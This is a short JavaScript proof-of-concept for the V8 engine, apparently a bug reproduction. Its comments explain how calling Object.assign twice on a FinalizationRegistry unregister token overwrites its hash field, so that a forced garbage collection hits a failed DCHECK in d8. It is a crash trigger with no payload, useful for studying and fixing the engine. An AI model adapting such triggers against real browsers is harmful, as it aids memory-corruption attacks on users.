/* poc.js */ 

// Prepare a finalization registry
function CleanUp() {
    print("CleanUp");
}
const registry = new FinalizationRegistry(CleanUp);

// The target object to be registered
let target = {
};
// The token used when unregistering from the registry
let unreg_token = {
};
// Register to registry: trigger the callback function when target is GC'ed
registry.register(target, undefined, unreg_token);

// The first time it is executed, it writes sidestep transition in map of unreg_token
// The second time it enters the fast path of Object.assign()
// properties_or_hash field of unreg_token is overwritten as FixedArray[0]
for(let i=0; i<2; i++) 
    Object.assign(unreg_token, {});   

// Let the target be garbage collected, then trigger the registry's finalization
// At this time, it will delete the entry from UnregisterTokenMap with unreg_token's properties_or_hash as the key
// But at this point, properties_or_hash has been overwritten as a pointer, it cannot be found, so DCHECK fails
target = undefined;
gc({type: "major"});
//./d8 \--expose-gc \./poc.js